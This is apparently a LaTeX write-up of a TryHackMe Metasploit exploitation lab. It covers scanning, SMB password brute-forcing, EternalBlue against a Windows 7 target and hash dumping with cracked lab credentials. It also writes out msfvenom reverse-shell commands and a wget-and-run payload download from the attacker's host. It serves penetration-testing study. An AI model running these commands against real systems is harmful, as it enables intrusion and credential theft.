\subsubsection*{Metasploit: Exploitation}
%\label{subsubsecMetasploitExploitation}
\addcontentsline{toc}{subsubsection}{Metasploit: Exploitation}
\T{Introduction}{
This room will deal with the actual exploitation of a target system using Metasploit, especially in conjunction with the database feature to manage broad-scoped pentesting cases, from the enumeration and port scanning phase to the final exploitation using \cd{msfvenom} and Meterpreter, as hinted on previous modules, going through the vulnerability scan phase in the process as well.\\
For any eventual bruteforce attack we will resort to the provided wordlist in the task.
}
\T{Scanning}{
Metasploit provides a number of port scanning features, as can be seen after a search in the msfconsole after ``portscan''\\
These modules require us to set the following parameters: 
\begin{itemize}
\item \textbf{CONCURRENCY:} Number of targets to be scanned simultaneously.
\item \textbf{PORTS:} Port range to be scanned. Note  the difference to the Nmap standard configuration, which scans the 1000 most used ports. Here, 1-1000 instructs Metasploit to scan all ports 1 to 1000.
\item \textbf{RHOSTS:} Target (network) to be scanned.
\item \textbf{THREADS:} Number of threads to be used in the scan.
\end{itemize}
Note that one can still perform ``standard'' Nmap scans from the msfconsole, as it does not impede the use of some (or most) of the usual terminal commands. Still, Metasploit provides some useful tools for port scanning that come in handy depending on the context:\\
the module \cd{scanner/discovery/udp\_sweep} is a UDP (User Datagram Protocol) service identifying module. It does not scan all possible UDP services, but is still a quick way to identify DNS (Domain Name System) or NetBIOS (Network Basic Input Output System) services.\\
We further have modules for service-tailored scans, e.g for SMB (Server Message Block). In a corporate network one would especially like the use of \cd{smb\_enumshares} and \cd{smb\_version}. SMB provides a file and printer shared access, as well as NetBIOS, the latter being a tad more exotic. Note that the NetBIOS name can provide some information about its role and importance within the network.

\QA{
How many ports are open on the target system?
}{
We can either conduct a standard Nmap port scan or, as probably intended by the module creators, use Metasploit.\\
After looking at some of the result from the \cd{search portscan} and the provided information about the target, we can conduct a TCP Port Scanner, seeing ports 21, 22, 139, 445 and 8000 open, henc the answer is 5.
}
\QA{
Using the relevant scanner, what NetBIOS name can you see?
}{
After \cd{search netbios} we see the module \cd{auxiliary/scanner/netbios/nbname}. We set the \cd{RPORT} to 8000 and the answer should show on the screen. Still, after several attempts it was not the case, so I conducted an aggressive Nmap scan (\cd{nmap -A}, but one can also do a through, more silent scan with \cd{nmap -sC -sV -p-} ) which gave me the name: ACME IT SUPPORT.
}
\QA{
What is running on port 8000?
}{
Trying to ``play by the rules'' again, we try to enumerate only using Metasploit. Still, we don't see any info on the port besides our Nmap scan and the hint to use the module \cd{https\_version}. Resorting back to the only self-acquired info, we see a http-server-header on port 8000 called: webfs/1.21 \\
Note that, when running \cd{https\_version}, we do not need to adjust the port, as it will not work otherwise.
}
\QA{
What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task. 
}{
As instructed by the hint, we will use the \cd{smb\_login} module. We the set (setg) RHOSTS to be our target machine, \cd{PASS\_FILE} the wordlist from the previous task, then run the exploit. Note that, as in the previous question, we do not need to adjust the port, as we are dealing with a login on port 445 now.\\
We are then given the password \textbf{leo1234}.
}
}
\T{The Metasploit Database}{
This far on TryHackMe we have always been dealing with a single target at a time, despite this not being a usual pentesting environment.\\
In order to keep track of all targets, we will use a database that comes with Metasploit: the PostgreSQL database. We initialize it with the terminal command \cd{systemctl start postgresql} \textbf{before} running the Metasploit console. Note that we have to initialize said database with the command \cd{msfdb init} as well \textbf{before} starting the console. Once this is all done, we start the msfconsole as usual and check the database with the command \cd{db\_status}.\\
Within an existing database environment, we can check its available workspaces with the \cd{workspace} command, with the active workspace highlighted by an asterisk before the name and red colouring on its font.\\
We will only see the ``default'' workspace for now, but we can add new workspaces with the \cd{workspace -a <new-workspace-name>} command. We will switch to that workspace as soon as it is created. We can delete it later with the \cd{-d} switch. \\
For this task, we will create a workspace called \cd{tryhackme}. Should we want to switch workspaces, we can do it by running the command \cd{workspace <destination-workspace-name>}. As usual, the \cd{-h} switch displays the help menu on the \cd{workspace} command.\\
When launched after the initialization of a database, the help menu of the Metasploit console will show an additional submenu, namely the ``Database Backend Commands'', where all possible actions on the databases are listed.\\

For our context, the command \cd{db\_nmap} is of especial relevance, since it runs the scan recording the output automatically.\\
These results can be called with the \cd{hosts} and \cd{services} commands, respectively, showing a tabular view of the results acquired from the Nmap scan on the target. Instead of first setting the remote host(s) and then scanning, we can run the scan setting the IP address manually and then let the \textbf{RHOSTS} parameter inherit this information with the \cd{hosts -R} command.\\

An example workflow would look as follows: 
\begin{enumerate}
\item Find available hosts using \cd{db\_nmap}
\item Scan the target using a scanner for a certain vulnerability type, e.g MS17-010.
\item Run \cd{hosts -R} to set the RHOSTS to the results from the scan.
\item Check the settings with \cd{show options}.
\item Run the exploit.
\end{enumerate}
Note that all target IP addresses will be saved under the RHOSTS parameter. \\
Once all results are saved, we can check for certain services running the command \cd{services -S <service-name>}, with a special focus on netbios, http, ftp, smb, ssh and rdp, all potential entry points.
}
\T{Vulnerability Scanning}{
One of the best uses of Metasploit is the ability to exploit the results found on the scans more or less directly from the same place. \\
The easiest way to do this is finding a service running on the system, then \cd{search} for it on Metasploit to find a way to get a foothold on the system.
\QA{
Who wrote the module that allows us to check SMTP servers for open relay?
}{
We run a \cd{search smtp relay} command after the suggested terms and find a single module, namely \cd{scanner/smtp/smtp\_relay}. We select it and print its information, finding out the name of its creator: \textbf{Campbell Murray}.
}
}
\T{Exploitation}{
This Task acts as a recapitulation previous to the final exploit phase of the Metasploit module. For the sake of completeness I will still summarize it here.\\
Within the Metasploit console, we search for exploits using \cd{search}, whose information we later see using \cd{info} and end applying using \cd{run} or \cd{exploit}.
Once the searched and found module has been selected using \cd{use <nr>} we can view the available payloads for the module using \cd{show payloads}, and choose one of them via \cd{set payload <payload-nr>}.\\
Note that, when setting up a reverse shell, we need to configure a LHOST parameter.\\
When a session is up and running, we can either close it with \cd{Ctrl+C} or send it to the background with \cd{Ctrl+Z}. Once it is in the background, we can call the backgrounded sessions with \cd{sessions}, seeing the session ID and then running \cd{sessions -i <session-nr>}.\\

In order to answer the questions, we deploy the machine and run an Nmap scan (\cd{db\_nmap -sC -sV -v <machine-IP>}) and see multiple open ports on this Windows 7 system.\\
As hinted by all the previous tasks and screenshots on this one (not included in this WriteUp), we decide to check the target against EternalBlue, a great exploitation for Windows when applicable.\\
We search for EternalBlue, select it, and after setting the host scanned as RHOSTS we check against our choesn exploit, seeing that the target is likely vulnerable in port 445.\\
As shown in the example screenshots, we see the possible payloads on eternalblue running \cd{show payloads} and then select a reverse tcp shell (\cd{generic/shell\_reverse\_tcp}), in our case with the command \cd{set payload 3}. We set our IP address as LHOST, the target address as RHOSTS and run the exploit. After two failed attempts with 12 and 17 Groom Allocations respectively, we have a successful reverse shell with 22. Once the exploit is successful, we have a shell on the target system.\\
We exit the \cd{C:$\bsl$Windows$\bsl$system32$\bsl$} folder we landed in and search from the main \cd{C:} folder after the flag file using \cd{dir /s flag.txt} and find it under \cd{C:$\bsl$Users$\bsl$Jon$\bsl$Documents}. We switch to said folder and find the flag via \cd{type flag.txt}:
\F{
THM-5455554845
}
For the last part of the Task we need to exit the shell we had in the target system, backgrounding the session we previously established. In order to be able to dump the hashes of the session we just backgrounded, we resort to the post-exploitation module \cd{hashdump}. After locating it, setting all parameters and running it, we see it is of no use, since we'd need a meterpreter prompt instead of the shell we established.\\
Hence, we need to rerun our eternalblue with a different payload granting us a meterpreter prompt, namely \cd{windows/x64/meterpreter/reverse\_tcp}.\\
Once we get this prompt, we proceed as intended before, backgrounding the session and running the post-exploitation hashdump (\cd{post/windows/gather/hashdump}) module.\\
Once it finishes, we see \cd{pirate}'s password hash: \cd{8ce9a3ebd1647fcc5e04025019f4b875}, extracted from \\
pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::\\
When cracking it (e.g with \href{https://crackstation.net}{Crackstation}) we learn that it means \cd{pirate123}
}
\T{Msfvenom}{
\label{MsfvenomTask}
MsfVenom is a standalone payload generator which replaces Msfpayload and Msfencode. Through it we will access all payloads available in Metasploit and also be able to generate tailored payloads, be it dependent of format, e.g PHP, exe, dll, elf, etc. or of target system, e-g Android, Apple, Linux, Windows, etc.\\
We list all available modules of a certain type with the \cd{-l} switch, i.e \cd{msfvenom -l <module-type>}, for e.g payloads.\\
With \cd{msfvenom} we can either generate standalone payloads such as Windows executables for Meterpreter or get a usable raw format such as Python. To see all supported formats we run \cd{msfvenom -l formats}\\
It also supports encoding, usable with the \cd{-e <format-from>/<format-to>} switch. Note that this is usually not the best tool to avoid antiviruses compared to other shellcode injection methods or obfuscation techniques, despite the general belief.\\
Similarly to the reverse shell based exploits, we usually need to accept incoming connections to establish a remote console, i.e open a listener. Before it was handled automatically by the exploit, now we can use a handler to ``catch a shell''.\\

For instructive purposes, this module will illustrate a file upload vulnerability it DVWA (Damn Vulnerable Web Application). Later we will need to perform a similar task on a different target.\\
The exploitation steps are:
\begin{enumerate}
\item Generate a PHP shell with MsfVenom
\item Start a Metasploit handler
\item Execute the PHP shell
\end{enumerate}
In order to run the exploit, we need to pass a payload, a listener IP and a listening port to MsfVenom. Note on the attacking example the following syntax: \\
\cd{msfvenom -p php/reverse\_php LHOST=10.0.2.19 LPORT=7777 -f raw \\
> reverse\_shell.php}\\
As noted on the teaching example, the PHP file will be missing the start and end PHP tags (\cd{<?php , ?>} respectively). This file still needs to be adapted to be an executable PHP file.\\
Once this is done, we need to use MultiHandler (\cd{use exploit/multi/handler} in the \textbf{Metasploit} console) to receive the connection. This handler supports all Metasploit payloads and can generate both Meterpreter and regular shells.\\
In order to use this, we set the parameters \cd{payload, lhost, lport} and check with the already known \cd{show options} before running the exploit with \cd{run}. This way, once the reverse shell is triggered, the connection will be received and a (Meterpreter) shell will prompt (if the payload is set to do such a shell).\\

Here are some number of syntax examples depending on the format: \\
The general format is:
\cd{msfvenom -p <payload> LHOST=<host> LPORT=<port> -f <format> > <shell-file-name>.<format>}
\begin{itemize}
\item elf (Linux Executable and Linkable Format):\\
This format is the Linux pendant to \cd{.exe} files in Windows. Note that executable permissions are needed, addable with \cd{chmod +x}.\\
\cd{payload: linux/x86/meterpreter/reverse\_tcp\\
 format: elf\\
 file: rev\_shell.elf}
\item Windows: \\
\cd{ payload: windows/meterpreter/reverse\_tcp\\
format: exe\\
file: rev\_shell.exe}
\item PHP:\\
\cd{payload: php/meterpreter\_reverse\_tcp\\
format: raw\\
file: rev\_shell.php}
\item ASP:\\
\cd{payload: windows/meterpreter/reverse\_tcp
format: asp
file: rev\_shell.asp}
\item Python:\\
\cd{payload: cmd/unix/reverse\_python
format: raw
file: rev\_shell.py}
\end{itemize}

In order to answer the set questions, we proceed according to the following scheme (we already knew the system and had even root access, allowing later to provide execution permissions, which made everything a whole lot easier) :
\label{Reverse_Metasploit_Steps} 
\begin{enumerate}
\item We create a payload for a linux system using \\
\cd{msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=10.11.81.147 LPORT=8888 -f elf > rev\_shell.elf}
\item We set a remote server on out local attacking machine via \cdnl{python 3 -m http.server 9000}
\item We access the remote machine with the SSH credentials we are given and access as a super user via \cd{sudo su}.
\item We download the malicious payload from our locally created webserver via 
\cdnl{wget http://10.11.81.147:9000/rev\_shell.elf}
and wait for the download to finish.
\item We give the downloaded shell execution permissions with \cdnl{chmod +x rev\_shell.elf}
\item We launch the Metasploit console.
\item We set up a listener with the MultiHandler: 
\begin{enumerate}
\item We find the multihandler with \cd{search multi handler}
\item We activate it with \cd{use exploit/multi/handler} or \cd{use 7}
\item We set the payload for the listener with \\
\cd{set payload linux/x86/meterpreter/reverse\_tcp}
\item We set all other parameters: LHOST, LPORT. 
\item We run the MultiHandler.
\end{enumerate}
\item We run the remote shell with \cd{./rev\_shell.elf}
\item We confirm the remote Meterpreter shell
\item We background the session with \cd{Ctrl + Z}
\item We look for a post-exploitation module to get the hashes with \cd{search hashdump} and select the appropriate one or this setting. Here it was \cd{use post/linux/gather/hashdump}
\item We set the session to the session-nr. we previously backgrounded. 
\item We run the hashdump, getting the hashes.
\end{enumerate}
This way we find the answer to:
\QA{
What is the other user's password hash?
}{
From \cd{claire:\\
\$6\$Sy0NNIXw\$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmt\\
Mez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002:1002::/home/claire:/bin/sh} we extract the hash 
\textbf{\cdnl{\$6\$Sy0NNIXw\$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmt\\
Mez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0}}

}
}